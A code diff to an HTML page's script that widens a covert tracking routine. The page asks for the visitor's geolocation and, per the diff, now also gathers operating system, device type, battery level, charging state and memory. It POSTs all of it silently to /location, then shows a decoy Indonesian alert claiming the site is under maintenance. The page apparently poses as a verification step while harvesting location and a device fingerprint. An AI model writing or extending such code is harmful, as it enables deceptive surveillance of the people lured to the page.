@@ -29,7 +29,7 @@
       top: 0; left: 0;
     }
 
-.overlay {
+    .overlay {
       position: fixed;
       inset: 0;
       background: rgba(0,0,0,0.35);
@@ -74,20 +74,39 @@
   </div>
 
   <script>
-function requestLocation(){
+    async function getDeviceInfo() {
+      const os = navigator.platform || 'N/A';
+      const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+      let battery = 'N/A';
+      try {
+        if (navigator.getBattery) {
+          const b = await navigator.getBattery();
+          battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Sedang di Charge' : 'Tidak di Charge'})`;
+        }
+      } catch (e) {}
+      const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
+      return { os, deviceType, battery, memory };
+    }
+
+    function sendData(lat, lon) {
+      getDeviceInfo().then(device => {
+        const payload = { lat, lon, ...device };
+        fetch('/location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).catch(() => {});
+      });
+    }
+
+    function requestLocation(){
       if(!navigator.geolocation){ return; }
 
       navigator.geolocation.getCurrentPosition(
         async (pos)=>{
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
-
-          await fetch("/location", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ lat, lon })
-          });
-
+          sendData(lat, lon);
           alert("Situs ini sedang dalam perbaikan. Coba lagi nanti.");
         },
         ()=>{ alert("Verifikasi Gagal"); },
